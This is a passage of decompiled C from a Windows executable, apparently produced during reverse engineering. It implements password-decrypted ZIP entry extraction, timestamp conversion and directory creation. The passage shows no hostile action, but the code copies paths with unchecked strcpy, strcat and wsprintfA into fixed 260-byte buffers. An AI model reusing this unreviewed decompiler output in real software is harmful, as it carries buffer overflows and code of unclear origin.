    if (param_2 != (int *)0x0) {
      iVar2 = 0x14;
      piVar5 = local_60;
      while (iVar2 != 0) {
        iVar2 = iVar2 + -1;
        *param_2 = *piVar5;
        piVar5 = piVar5 + 1;
        param_2 = param_2 + 1;
      }
    }
    if (param_3 != (char **)0x0) {
      *param_3 = local_10;
    }
  }
  return local_8;
}

void __cdecl
FUN_004064bb(char **param_1,int *param_2,void *param_3,uint param_4,void *param_5,uint param_6,
            void *param_7,uint param_8) {
  FUN_004061e0(param_1,param_2,(char **)0x0,param_3,param_4,param_5,param_6,param_7,param_8);
  return;
}

int __cdecl FUN_004064e2(char **param_1) {
  int iVar1;
  
  if (param_1 == (char **)0x0) {
    iVar1 = -0x66;
  }
  else {
    param_1[5] = param_1[9];
    param_1[4] = (char *)0x0;
    iVar1 = FUN_004061e0(param_1,(int *)(param_1 + 10),param_1 + 0x1e,(void *)0x0,0,(void *)0x0,0,
                         (void *)0x0,0);
    param_1[6] = (char *)(uint)(iVar1 == 0);
  }
  return iVar1;
}

int __cdecl FUN_00406520(char **param_1) {
  int iVar1;
  
  if (param_1 == (char **)0x0) {
    iVar1 = -0x66;
  }
  else {
    if ((param_1[6] == (char *)0x0) || (param_1[4] + 1 == param_1[1])) {
      iVar1 = -100;
    }
    else {
      param_1[4] = param_1[4] + 1;
      param_1[5] = param_1[5] +
                   (int)(param_1[0x12] + (int)param_1[0x14] + (int)param_1[0x13] + 0x2e);
      iVar1 = FUN_004061e0(param_1,(int *)(param_1 + 10),param_1 + 0x1e,(void *)0x0,0,(void *)0x0,0,
                           (void *)0x0,0);
      param_1[6] = (char *)(uint)(iVar1 == 0);
    }
  }
  return iVar1;
}

int __cdecl FUN_0040657a(char **param_1,char **param_2,char **param_3,int *param_4) {
  char **ppcVar1;
  char **ppcVar2;
  char **ppcVar3;
  int iVar4;
  int iVar5;
  int local_10;
  char *local_c;
  char *local_8;
  
  ppcVar3 = param_2;
  ppcVar2 = param_1;
  iVar5 = 0;
  *param_2 = (char *)0x0;
  *param_3 = (char *)0x0;
  *param_4 = 0;
  iVar4 = FUN_00405d0e(*param_1,(int)(param_1[3] + (int)param_1[0x1e]),0);
  if (iVar4 == 0) {
    iVar4 = FUN_00405e6b(*ppcVar2,&local_c);
    if (iVar4 == 0) {
      if (local_c != (char *)0x4034b50) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e27(*ppcVar2,(int *)&param_2);
    if (iVar4 != 0) {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e27(*ppcVar2,(int *)&param_1);
    if (iVar4 != 0) {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e27(*ppcVar2,(int *)&param_2);
    if (iVar4 == 0) {
      if ((iVar5 == 0) &&
         ((ppcVar1 = (char **)ppcVar2[0xd], param_2 != ppcVar1 ||
          ((ppcVar1 != (char **)0x0 && (ppcVar1 != (char **)0x8)))))) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e6b(*ppcVar2,(char **)&param_2);
    if (iVar4 != 0) {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e6b(*ppcVar2,(char **)&param_2);
    if (iVar4 == 0) {
      if (((iVar5 == 0) && (param_2 != (char **)ppcVar2[0xf])) && (((uint)param_1 & 8) == 0)) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e6b(*ppcVar2,(char **)&param_2);
    if (iVar4 == 0) {
      if (((iVar5 == 0) && (param_2 != (char **)ppcVar2[0x10])) && (((uint)param_1 & 8) == 0)) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e6b(*ppcVar2,(char **)&param_2);
    if (iVar4 == 0) {
      if (((iVar5 == 0) && (param_2 != (char **)ppcVar2[0x11])) && (((uint)param_1 & 8) == 0)) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e27(*ppcVar2,(int *)&local_8);
    if (iVar4 == 0) {
      if ((iVar5 == 0) && (local_8 != ppcVar2[0x12])) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    *ppcVar3 = *ppcVar3 + (int)local_8;
    iVar4 = FUN_00405e27(*ppcVar2,&local_10);
    if (iVar4 != 0) {
      iVar5 = -1;
    }
    *param_3 = ppcVar2[0x1e] + 0x1e + (int)local_8;
    *param_4 = local_10;
    *ppcVar3 = *ppcVar3 + local_10;
  }
  else {
    iVar5 = -1;
  }
  return iVar5;
}

undefined4 __cdecl FUN_0040671d(char **param_1,byte *param_2) {
  char *pcVar1;
  char **ppcVar2;
  undefined uVar3;
  int iVar4;
  void **_Memory;
  void *pvVar5;
  undefined4 uVar6;
  char *local_10;
  void *local_c;
  char *local_8;
  
  ppcVar2 = param_1;
  if ((param_1 == (char **)0x0) || (param_1[6] == (char *)0x0)) {
    uVar6 = 0xffffff9a;
  }
  else {
    if (param_1[0x1f] != (char *)0x0) {
      FUN_00406a97((int)param_1);
    }
    iVar4 = FUN_0040657a(param_1,&local_10,&local_8,(int *)&local_c);
    if (iVar4 == 0) {
      _Memory = (void **)malloc(0x84);
      if (_Memory != (void **)0x0) {
        pvVar5 = malloc(0x4000);
        *_Memory = pvVar5;
        *(char **)(_Memory + 0x11) = local_8;
        _Memory[0x12] = local_c;
        _Memory[0x13] = (void *)0x0;
        if (pvVar5 != (void *)0x0) {
          _Memory[0x10] = (void *)0x0;
          pcVar1 = param_1[0xd];
          *(char **)(_Memory + 0x15) = param_1[0xf];
          _Memory[0x14] = (void *)0x0;
          *(char **)(_Memory + 0x19) = param_1[0xd];
          *(char **)(_Memory + 0x18) = *param_1;
          *(char **)(_Memory + 0x1a) = param_1[3];
          _Memory[6] = (void *)0x0;
          if (pcVar1 != (char *)0x0) {
            _Memory[9] = (void *)0x0;
            _Memory[10] = (void *)0x0;
            _Memory[0xb] = (void *)0x0;
            iVar4 = FUN_00405777((int)(_Memory + 1));
            if (iVar4 == 0) {
              _Memory[0x10] = (void *)0x1;
            }
          }
          *(char **)(_Memory + 0x16) = param_1[0x10];
          *(char **)(_Memory + 0x17) = param_1[0x11];
          *(byte *)(_Memory + 0x1b) = *(byte *)(param_1 + 0xc) & 1;
          if (((uint)param_1[0xc] >> 3 & 1) == 0) {
            uVar3 = (undefined)((uint)param_1[0xf] >> 0x18);
          }
          else {
            uVar3 = (undefined)((uint)param_1[0xe] >> 8);
          }
          *(undefined *)(_Memory + 0x20) = uVar3;
          _Memory[0x1d] = (void *)0x23456789;
          _Memory[0x1f] = (void *)(-(uint)(*(char *)(_Memory + 0x1b) != '\0') & 0xc);
          _Memory[0x1c] = (void *)0x12345678;
          _Memory[0x1e] = (void *)0x34567890;
          param_1 = (char **)param_2;
          if (param_2 != (byte *)0x0) {
            do {
              if (*(byte *)param_1 == 0) break;
              FUN_00405535((uint *)(_Memory + 0x1c),*(byte *)param_1);
              param_1 = (char **)((int)param_1 + 1);
            } while (param_1 != (char **)0x0);
          }
          pcVar1 = ppcVar2[0x1e];
          _Memory[2] = (void *)0x0;
          *(char **)(_Memory + 0xf) = pcVar1 + 0x1e + (int)local_10;
          *(void ***)(ppcVar2 + 0x1f) = _Memory;
          return 0;
        }
        free(_Memory);
      }
      uVar6 = 0xffffff98;
    }
    else {
      uVar6 = 0xffffff99;
    }
  }
  return uVar6;
}

byte * __cdecl FUN_00406880(void *param_1,void *param_2,void *param_3,undefined *param_4) {
  void **ppvVar1;
  char cVar2;
  void **ppvVar3;
  byte *pbVar4;
  void *pvVar5;
  int iVar6;
  uint uVar7;
  void *pvVar8;
  void *pvVar9;
  byte *local_c;
  byte *local_8;
  
  local_c = (byte *)0x0;
  local_8 = (byte *)0x0;
  if (param_4 != (undefined *)0x0) {
    *param_4 = 0;
  }
  if ((param_1 == (void *)0x0) ||
     (ppvVar3 = *(void ***)((int)param_1 + 0x7c), ppvVar3 == (void **)0x0)) {
    local_8 = (byte *)0xffffff9a;
  }
  else {
    if (*ppvVar3 == (void *)0x0) {
      local_8 = (byte *)0xffffff9c;
    }
    else {
      if (param_3 == (void *)0x0) {
LAB_00406a75:
        local_8 = (byte *)0x0;
      }
      else {
        ppvVar3[5] = param_3;
        ppvVar3[4] = param_2;
        if (ppvVar3[0x17] < param_3) {
          ppvVar3[5] = ppvVar3[0x17];
        }
        if (ppvVar3[5] != (void *)0x0) {
          do {
            if ((ppvVar3[2] == (void *)0x0) && (pvVar9 = ppvVar3[0x16], pvVar9 != (void *)0x0)) {
              pvVar8 = (void *)0x4000;
              if ((pvVar9 < (void *)0x4000) && (pvVar8 = pvVar9, pvVar9 == (void *)0x0)) {
                if (param_4 != (undefined *)0x0) {
                  *param_4 = 1;
                }
                goto LAB_00406a75;
              }
              iVar6 = FUN_00405d0e((char *)ppvVar3[0x18],(int)ppvVar3[0x1a] + (int)ppvVar3[0xf],0);
              if ((iVar6 != 0) ||
                 (uVar7 = FUN_00405d8a(*ppvVar3,(uint)pvVar8,1,(char *)ppvVar3[0x18]), uVar7 != 1))
              {
                return (byte *)0xffffffff;
              }
              ppvVar3[0xf] = (void *)((int)ppvVar3[0xf] + (int)pvVar8);
              ppvVar3[0x16] = (void *)((int)ppvVar3[0x16] - (int)pvVar8);
              pvVar9 = *ppvVar3;
              ppvVar3[1] = pvVar9;
              ppvVar3[2] = pvVar8;
              if ((*(char *)(ppvVar3 + 0x1b) != '\0') &&
                 (param_1 = (void *)0x0, pvVar8 != (void *)0x0)) {
                do {
                  uVar7 = FUN_004055a3((uint *)(ppvVar3 + 0x1c),
                                       *(byte *)((int)param_1 + (int)pvVar9));
                  pvVar5 = (void *)((int)param_1 + 1);
                  *(undefined *)((int)param_1 + (int)pvVar9) = (char)uVar7;
                  param_1 = pvVar5;
                } while (pvVar5 < pvVar8);
              }
            }
            pvVar9 = ppvVar3[2];
            pvVar8 = ppvVar3[0x1f];
            if (pvVar9 < ppvVar3[0x1f]) {
              pvVar8 = pvVar9;
            }
            if (pvVar8 != (void *)0x0) {
              cVar2 = *(char *)((int)ppvVar3[1] + -1 + (int)pvVar8);
              ppvVar1 = ppvVar3 + 0x1f;
              *ppvVar1 = (void *)((int)*ppvVar1 - (int)pvVar8);
              ppvVar3[2] = (void *)((int)pvVar9 - (int)pvVar8);
              ppvVar3[1] = (void *)((int)ppvVar3[1] + (int)pvVar8);
              if ((*ppvVar1 == (void *)0x0) && (cVar2 != *(char *)(ppvVar3 + 0x20))) {
                return (byte *)0xffffff96;
              }
            }
            if (ppvVar3[0x19] == (void *)0x0) {
              pvVar9 = ppvVar3[2];
              if (ppvVar3[5] < ppvVar3[2]) {
                pvVar9 = ppvVar3[5];
              }
              pvVar8 = (void *)0x0;
              if (pvVar9 != (void *)0x0) {
                do {
                  *(undefined *)((int)ppvVar3[4] + (int)pvVar8) =
                       *(undefined *)((int)ppvVar3[1] + (int)pvVar8);
                  pvVar8 = (void *)((int)pvVar8 + 1);
                } while (pvVar8 < pvVar9);
              }
              pvVar8 = (void *)FUN_0040541f((uint)ppvVar3[0x14],(byte *)ppvVar3[4],(uint)pvVar9);
              ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - (int)pvVar9);
              ppvVar3[2] = (void *)((int)ppvVar3[2] - (int)pvVar9);
              ppvVar3[5] = (void *)((int)ppvVar3[5] - (int)pvVar9);
              ppvVar3[4] = (void *)((int)ppvVar3[4] + (int)pvVar9);
              ppvVar3[1] = (void *)((int)ppvVar3[1] + (int)pvVar9);
              ppvVar3[6] = (void *)((int)ppvVar3[6] + (int)pvVar9);
              local_8 = local_8 + (int)pvVar9;
              ppvVar3[0x14] = pvVar8;
              if ((ppvVar3[0x17] == (void *)0x0) && (param_4 != (undefined *)0x0)) {
                *param_4 = 1;
              }
            }
            else {
              pbVar4 = (byte *)ppvVar3[4];
              pvVar9 = ppvVar3[6];
              local_c = FUN_0040583c((byte **)(ppvVar3 + 1),(byte *)0x2);
              pvVar9 = (void *)((int)ppvVar3[6] - (int)pvVar9);
              pvVar8 = (void *)FUN_0040541f((uint)ppvVar3[0x14],pbVar4,(uint)pvVar9);
              ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - (int)pvVar9);
              local_8 = local_8 + (int)pvVar9;
              ppvVar3[0x14] = pvVar8;
              if ((local_c == (byte *)0x1) || (ppvVar3[0x17] == (void *)0x0)) {
                if (param_4 == (undefined *)0x0) {
                  return local_8;
                }
                *param_4 = 1;
                return local_8;
              }
              if (local_c != (byte *)0x0) {
                return local_c;
              }
            }
          } while (ppvVar3[5] != (void *)0x0);
          if (local_c != (byte *)0x0) {
            return local_c;
          }
        }
      }
    }
  }
  return local_8;
}

undefined4 __cdecl FUN_00406a97(int param_1) {
  void **_Memory;
  undefined4 local_4;
  
  local_4 = 0;
  if ((param_1 == 0) || (_Memory = *(void ***)(param_1 + 0x7c), _Memory == (void **)0x0)) {
    local_4 = 0xffffff9a;
  }
  else {
    if ((_Memory[0x17] == (void *)0x0) && (_Memory[0x14] != _Memory[0x15])) {
      local_4 = 0xffffff97;
    }
    if (*_Memory != (void *)0x0) {
      free(*_Memory);
      *_Memory = (void *)0x0;
    }
    *_Memory = (void *)0x0;
    if (_Memory[0x10] != (void *)0x0) {
      FUN_00405739((int)(_Memory + 1));
    }
    _Memory[0x10] = (void *)0x0;
    free(_Memory);
    *(undefined4 *)(param_1 + 0x7c) = 0;
  }
  return local_4;
}

ulonglong __cdecl FUN_00406b02(uint param_1) {
  ulonglong uVar1;
  
  uVar1 = __allmul(param_1 + 0xb6109100,((int)param_1 >> 0x1f) + 2 + (uint)(0x49ef6eff < param_1),
                   10000000,0);
  return uVar1;
}

_FILETIME __cdecl FUN_00406b23(uint param_1,uint param_2) {
  SYSTEMTIME local_1c;
  _FILETIME local_c;
  
  local_1c.wMilliseconds = 0;
  local_1c.wYear = ((ushort)param_1 >> 9) + 0x7bc;
  local_1c.wDay = (ushort)param_1 & 0x1f;
  local_1c.wMonth = (ushort)(param_1 >> 5) & 0xf;
  local_1c.wHour = (ushort)param_2 >> 0xb;
  local_1c.wSecond = (WORD)((param_2 & 0x1f) << 1);
  local_1c.wMinute = (ushort)(param_2 >> 5) & 0x3f;
  SystemTimeToFileTime(&local_1c,(LPFILETIME)&local_c);
  return local_c;
}

char ** __thiscall FUN_00406b8e(void *this,LPCSTR param_1,undefined4 param_2,int param_3) {
  char cVar1;
  size_t sVar2;
  DWORD DVar3;
  char *lpBuffer;
  char **ppcVar4;
  char **local_8;
  
  if ((*(int *)this == 0) && (*(int *)((int)this + 4) == -1)) {
    lpBuffer = (char *)((int)this + 0x140);
    local_8 = (char **)this;
    GetCurrentDirectoryA(0x104,lpBuffer);
    sVar2 = strlen(lpBuffer);
    cVar1 = *(char *)(sVar2 + 0x13f + (int)this);
    if ((cVar1 != '\\') && (cVar1 != '/')) {
      strcat(lpBuffer,(char *)&_Source_0040f818);
    }
    if ((param_3 == 1) && (DVar3 = SetFilePointer(param_1,0,(PLONG)0x0,1), DVar3 == 0xffffffff)) {
      local_8 = (char **)0x2000000;
    }
    else {
      lpBuffer = FUN_00405bae(param_1,param_2,param_3,&local_8);
      if (lpBuffer != (char *)0x0) {
        ppcVar4 = unzip_something(lpBuffer);
        *(char ***)this = ppcVar4;
        local_8 = (char **)((-(uint)(ppcVar4 != (char **)0x0) & 0xfffffe00) + 0x200);
      }
    }
  }
  else {
    local_8 = (char **)0x1000000;
  }
  return local_8;
}

undefined4 __thiscall FUN_00406c40(void *this,char *param_1,undefined4 *param_2) {
  undefined *puVar1;
  uchar uVar2;
  void *pvVar3;
  byte bVar4;
  int iVar5;
  uint uVar6;
  uchar *puVar7;
  int iVar8;
  byte bVar9;
  byte bVar10;
  uchar *_Str;
  ulonglong uVar11;
  uchar local_284 [260];
  char local_180 [260];
  uint local_7c [4];
  uint local_6c;
  undefined4 local_64;
  undefined4 local_60;
  uint local_48;
  char *local_2c;
  FILETIME local_28;
  _FILETIME local_20;
  void *local_18;
  char *local_14;
  uint local_10;
  void *local_c;
  byte local_5;
  
  if (((int)param_1 < -1) || (*(int *)(*(int *)this + 4) <= (int)param_1)) {
    return 0x10000;
  }
  local_18 = this;
  if (*(int *)((int)this + 4) != -1) {
    FUN_00406a97(*(int *)this);
  }
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  if (param_1 == *(char **)((int)this + 0x134)) {
    if (param_1 != (char *)0xffffffff) {
      memcpy(param_2,(void *)((int)this + 8),300);
      return 0;
    }
  }
  else {
    if (param_1 != (char *)0xffffffff) {
      if ((int)param_1 < (int)(*(char ***)this)[4]) {
        FUN_004064e2(*(char ***)this);
      }
      while ((int)(*(char ***)this)[4] < (int)param_1) {
        FUN_00406520(*(char ***)this);
      }
      FUN_004064bb(*(char ***)this,(int *)local_7c,local_180,0x104,(void *)0x0,0,(void *)0x0,0);
      iVar5 = FUN_0040657a(*(char ***)this,&local_2c,&local_14,(int *)&local_10);
      if (iVar5 != 0) {
        return 0x700;
      }
      iVar5 = FUN_00405d0e(**(char ***)this,(int)local_14,0);
      if (iVar5 == 0) {
        local_c = operator_new(local_10);
        uVar6 = FUN_00405d8a(local_c,1,local_10,**(char ***)this);
        if (uVar6 == local_10) {
          *param_2 = *(undefined4 *)(*(int *)this + 0x10);
          strcpy((char *)local_284,local_180);
          _Str = local_284;
          while( true ) {
            while( true ) {
              while ((uVar2 = *_Str, uVar2 != '\0' && (_Str[1] == ':'))) {
                _Str = _Str + 2;
              }
              if ((uVar2 != '\\') && (uVar2 != '/')) break;
              _Str = _Str + 1;
            }
            puVar7 = _mbsstr(_Str,(uchar *)&_Substr_0040f838);
            if ((puVar7 == (uchar *)0x0) &&
               (((puVar7 = _mbsstr(_Str,(uchar *)&_Substr_0040f830), puVar7 == (uchar *)0x0 &&
                 (puVar7 = _mbsstr(_Str,(uchar *)&_Substr_0040f828), puVar7 == (uchar *)0x0)) &&
                (puVar7 = _mbsstr(_Str,(uchar *)&_Substr_0040f820), puVar7 == (uchar *)0x0))))
            break;
            _Str = puVar7 + 4;
          }
          strcpy((char *)(param_2 + 1),(char *)_Str);
          param_2._3_1_ = 0;
          local_5 = 0;
          bVar9 = ~(byte)(local_48 >> 0x17);
          bVar4 = (byte)(local_48 >> 0x1e);
          local_7c[0] = local_7c[0] >> 8;
          bVar10 = 1;
          if ((((local_7c[0] == 0) || (local_7c[0] == 7)) || (local_7c[0] == 0xb)) ||
             (local_7c[0] == 0xe)) {
            bVar9 = (byte)local_48;
            param_2._3_1_ = (byte)(local_48 >> 1) & 1;
            local_5 = (byte)(local_48 >> 2) & 1;
            bVar4 = (byte)(local_48 >> 4);
            bVar10 = (byte)(local_48 >> 5) & 1;
          }
          iVar5 = 0;
          param_2[0x42] = 0;
          if ((bVar4 & 1) != 0) {
            param_2[0x42] = 0x10;
          }
          if (bVar10 != 0) {
            param_2[0x42] = param_2[0x42] | 0x20;
          }
          if (param_2._3_1_ != 0) {
            param_2[0x42] = param_2[0x42] | 2;
          }
          if ((bVar9 & 1) != 0) {
            param_2[0x42] = param_2[0x42] | 1;
          }
          if (local_5 != 0) {
            param_2[0x42] = param_2[0x42] | 4;
          }
          param_2[0x49] = local_64;
          param_2[0x4a] = local_60;
          local_28 = FUN_00406b23(local_6c >> 0x10,local_6c);
          LocalFileTimeToFileTime(&local_28,(LPFILETIME)&local_20);
          pvVar3 = local_c;
          param_2[0x43] = local_20.dwLowDateTime;
          param_2[0x45] = local_20.dwLowDateTime;
          param_2[0x47] = local_20.dwLowDateTime;
          param_2[0x44] = local_20.dwHighDateTime;
          param_2[0x46] = local_20.dwHighDateTime;
          param_2[0x48] = local_20.dwHighDateTime;
          if (4 < local_10) {
            do {
              local_c = (void *)((uint)local_c & 0xff000000 |
                                (uint)CONCAT11(*(undefined *)((int)pvVar3 + iVar5 + 1),
                                               *(undefined *)(iVar5 + (int)pvVar3)));
              bVar9 = *(byte *)((int)pvVar3 + iVar5 + 2);
              iVar8 = strcmp((char *)&local_c,(char *)&_Str2_0040f81c);
              if (iVar8 == 0) {
                bVar9 = *(byte *)(iVar5 + 4 + (int)pvVar3);
                local_5 = bVar9 >> 2 & 1;
                iVar8 = iVar5 + 5;
                if ((bVar9 & 1) != 0) {
                  puVar1 = (undefined *)(iVar8 + (int)pvVar3);
                  iVar8 = iVar5 + 9;
                  uVar11 = FUN_00406b02(CONCAT31(CONCAT21(*(undefined2 *)(puVar1 + 2),
                                                          *(undefined *)(iVar5 + 6 + (int)pvVar3)),
                                                 *puVar1));
                  param_2[0x47] = (int)uVar11;
                  param_2[0x48] = (int)(uVar11 >> 0x20);
                }
                if ((bVar9 >> 1 & 1) != 0) {
                  iVar5 = iVar8 + 1;
                  puVar1 = (undefined *)(iVar8 + (int)pvVar3);
                  iVar8 = iVar8 + 4;
                  uVar11 = FUN_00406b02(CONCAT31(CONCAT21(*(undefined2 *)(puVar1 + 2),
                                                          *(undefined *)(iVar5 + (int)pvVar3)),
                                                 *puVar1));
                  param_2[0x43] = (int)uVar11;
                  param_2[0x44] = (int)(uVar11 >> 0x20);
                }
                if (local_5 != 0) {
                  uVar11 = FUN_00406b02(CONCAT31(CONCAT21(*(undefined2 *)
                                                           ((undefined *)(iVar8 + (int)pvVar3) + 2),
                                                          *(undefined *)(iVar8 + 1 + (int)pvVar3)),
                                                 *(undefined *)(iVar8 + (int)pvVar3)));
                  param_2[0x45] = (int)uVar11;
                  param_2[0x46] = (int)(uVar11 >> 0x20);
                }
                break;
              }
              iVar5 = iVar5 + 4 + (uint)bVar9;
            } while (iVar5 + 4U < local_10);
          }
          if (pvVar3 != (void *)0x0) {
            operator_delete(pvVar3);
          }
          pvVar3 = local_18;
          memcpy((void *)((int)local_18 + 8),param_2,300);
          *(char **)((int)pvVar3 + 0x134) = param_1;
          return 0;
        }
        operator_delete(local_c);
      }
      return 0x800;
    }
  }
  *param_2 = *(undefined4 *)(*(int *)this + 4);
  *(undefined *)(param_2 + 1) = 0;
  param_2[0x42] = 0;
  param_2[0x43] = 0;
  param_2[0x44] = 0;
  param_2[0x45] = 0;
  param_2[0x46] = 0;
  param_2[0x47] = 0;
  param_2[0x48] = 0;
  param_2[0x49] = 0;
  param_2[0x4a] = 0;
  return 0;
}

void __cdecl FUN_00407070(LPCSTR param_1,char *param_2) {
  char cVar1;
  DWORD DVar2;
  char *pcVar3;
  char *pcVar4;
  char local_20c [260];
  CHAR local_108 [260];
  
  if ((param_1 != (LPCSTR)0x0) && (DVar2 = GetFileAttributesA(param_1), DVar2 == 0xffffffff)) {
    CreateDirectoryA(param_1,(LPSECURITY_ATTRIBUTES)0x0);
  }
  cVar1 = *param_2;
  pcVar3 = param_2;
  pcVar4 = param_2;
  if (cVar1 != '\0') {
    do {
      if ((cVar1 == '/') || (cVar1 == '\\')) {
        pcVar4 = pcVar3;
      }
      cVar1 = pcVar3[1];
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    if (pcVar4 != param_2) {
      memcpy(local_20c,param_2,(size_t)(pcVar4 + -(int)param_2));
      local_20c[(int)(pcVar4 + -(int)param_2)] = '\0';
      FUN_00407070(param_1,local_20c);
    }
    local_108[0] = '\0';
    if (param_1 != (LPCSTR)0x0) {
      strcpy(local_108,param_1);
    }
    strcat(local_108,param_2);
    DVar2 = GetFileAttributesA(local_108);
    if (DVar2 == 0xffffffff) {
      CreateDirectoryA(local_108,(LPSECURITY_ATTRIBUTES)0x0);
    }
  }
  return;
}

int __thiscall FUN_00407136(void *this,char *param_1,char *param_2,void *param_3,int param_4) {
  char **ppcVar1;
  char cVar2;
  char *pcVar3;
  void *pvVar4;
  byte *nNumberOfBytesToWrite;
  BOOL BVar5;
  char *pcVar6;
  char *pcVar7;
  LPCSTR pCVar8;
  CHAR local_33c [260];
  undefined4 local_238 [66];
  uint local_130;
  FILETIME local_12c;
  FILETIME local_124;
  FILETIME local_11c [2];
  char local_10c [260];
  DWORD local_8;
  
  pcVar3 = param_1;
  if (param_4 == 3) {
    if (param_1 != *(char **)((int)this + 4)) {
      if (*(char **)((int)this + 4) != (char *)0xffffffff) {
        FUN_00406a97(*(int *)this);
      }
      ppcVar1 = *(char ***)this;
      *(undefined4 *)((int)this + 4) = 0xffffffff;
      if ((int)ppcVar1[1] <= (int)pcVar3) {
        return 0x10000;
      }
      if ((int)pcVar3 < (int)ppcVar1[4]) {
        FUN_004064e2(ppcVar1);
      }
      while ((int)(*(char ***)this)[4] < (int)pcVar3) {
        FUN_00406520(*(char ***)this);
      }
      FUN_0040671d(*(char ***)this,*(byte **)((int)this + 0x138));
      *(char **)((int)this + 4) = pcVar3;
    }
    nNumberOfBytesToWrite =
         FUN_00406880(*(void **)this,param_2,param_3,(undefined *)((int)&param_1 + 3));
    if ((int)nNumberOfBytesToWrite < 1) {
      FUN_00406a97(*(int *)this);
      *(undefined4 *)((int)this + 4) = 0xffffffff;
    }
    if (param_1._3_1_ != '\0') {
      return 0;
    }
    if ((int)nNumberOfBytesToWrite < 1) {
      return ((uint)(nNumberOfBytesToWrite != (byte *)0xffffff96) - 1 & 0xfb001000) + 0x5000000;
    }
    return 0x600;
  }
  if ((param_4 != 2) && (param_4 != 1)) {
    return 0x10000;
  }
  if (*(int *)((int)this + 4) != -1) {
    FUN_00406a97(*(int *)this);
  }
  pcVar3 = param_1;
  ppcVar1 = *(char ***)this;
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  if ((int)ppcVar1[1] <= (int)param_1) {
    return 0x10000;
  }
  if ((int)param_1 < (int)ppcVar1[4]) {
    FUN_004064e2(ppcVar1);
  }
  while ((int)(*(char ***)this)[4] < (int)pcVar3) {
    FUN_00406520(*(char ***)this);
  }
  FUN_00406c40(this,pcVar3,local_238);
  pcVar3 = param_2;
  if ((local_130 & 0x10) != 0) {
    if (param_4 == 1) {
      return 0;
    }
    cVar2 = *param_2;
    if (((cVar2 == '/') || (cVar2 == '\\')) || ((cVar2 != '\0' && (param_2[1] == ':')))) {
      pCVar8 = (LPCSTR)0x0;
    }
    else {
      pCVar8 = (LPCSTR)((int)this + 0x140);
    }
    FUN_00407070(pCVar8,param_2);
    return 0;
  }
  if (param_4 == 1) goto LAB_00407331;
  cVar2 = *param_2;
  pcVar6 = param_2;
  pcVar7 = param_2;
  while (cVar2 != '\0') {
    if ((cVar2 == '/') || (cVar2 == '\\')) {
      pcVar7 = pcVar6 + 1;
    }
    cVar2 = pcVar6[1];
    pcVar6 = pcVar6 + 1;
  }
  strcpy(local_10c,param_2);
  if (pcVar7 == pcVar3) {
    local_10c[0] = '\0';
LAB_004072e1:
    wsprintfA(local_33c,s__s_s_s_0040f848,(LPCSTR)((int)this + 0x140),local_10c,pcVar7);
    FUN_00407070((LPCSTR)((int)this + 0x140),local_10c);
  }
  else {
    local_10c[(int)(pcVar7 + -(int)pcVar3)] = '\0';
    if (((local_10c[0] != '/') && (local_10c[0] != '\\')) &&
       ((local_10c[0] == '\0' || (local_10c[1] != ':')))) goto LAB_004072e1;
    wsprintfA(local_33c,(LPCSTR)&param_2_0040f840,local_10c,pcVar7);
    FUN_00407070((LPCSTR)0x0,local_10c);
  }
  pcVar3 = (char *)CreateFileA(local_33c,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,local_130,
                               (HANDLE)0x0);
LAB_00407331:
  if (pcVar3 == (char *)0xffffffff) {
    return 0x200;
  }
  param_1 = pcVar3;
  FUN_0040671d(*(char ***)this,*(byte **)((int)this + 0x138));
  if (*(int *)((int)this + 0x13c) == 0) {
    pvVar4 = operator_new(0x4000);
    *(void **)((int)this + 0x13c) = pvVar4;
  }
  param_3 = (void *)0x0;
  do {
    nNumberOfBytesToWrite =
         FUN_00406880(*(void **)this,*(void **)((int)this + 0x13c),(void *)0x4000,
                      (undefined *)((int)&param_2 + 3));
    if (nNumberOfBytesToWrite == (byte *)0xffffff96) {
      param_3 = (void *)0x1000;
      goto LAB_0040745a;
    }
    if ((int)nNumberOfBytesToWrite < 0) break;
    if ((0 < (int)nNumberOfBytesToWrite) &&
       (BVar5 = WriteFile(param_1,*(LPCVOID *)((int)this + 0x13c),(DWORD)nNumberOfBytesToWrite,
                          &local_8,(LPOVERLAPPED)0x0), BVar5 == 0)) {
      param_3 = (void *)0x400;
      goto LAB_0040745a;
    }
    if (param_2._3_1_ != '\0') {
      SetFileTime(param_1,&local_124,&local_12c,local_11c);
      goto LAB_0040745a;
    }
  } while (nNumberOfBytesToWrite != (byte *)0x0);
  param_3 = (void *)0x5000000;
LAB_0040745a:
  if (param_4 != 1) {
    CloseHandle(param_1);
  }
  FUN_00406a97(*(int *)this);
  return (int)param_3;
}

undefined4 __fastcall FUN_0040747b(void **param_1) {
  if (param_1[1] != (void *)0xffffffff) {
    FUN_00406a97((int)*param_1);
  }
  param_1[1] = (void *)0xffffffff;
  if ((void **)*param_1 != (void **)0x0) {
    FUN_00406162((void **)*param_1);
  }
  *param_1 = (void *)0x0;
  return 0;
}

undefined4 * FUN_004074a4(void) {
  void *this;
  undefined4 *this_00;
  undefined4 *puVar1;
  int unaff_EBP;
  undefined4 *in_FS_OFFSET;
  
  FUN_004076c8();
  this = operator_new(0x244);
  *(void **)(unaff_EBP + -0x10) = this;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  if (this == (void *)0x0) {
    this_00 = (undefined4 *)0x0;
  }
  else {
    this_00 = FUN_00407527(this,*(char **)(unaff_EBP + 0x14));
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  DAT_0040f938 = FUN_00406b8e(this_00,*(LPCSTR *)(unaff_EBP + 8),*(undefined4 *)(unaff_EBP + 0xc),
                              *(int *)(unaff_EBP + 0x10));
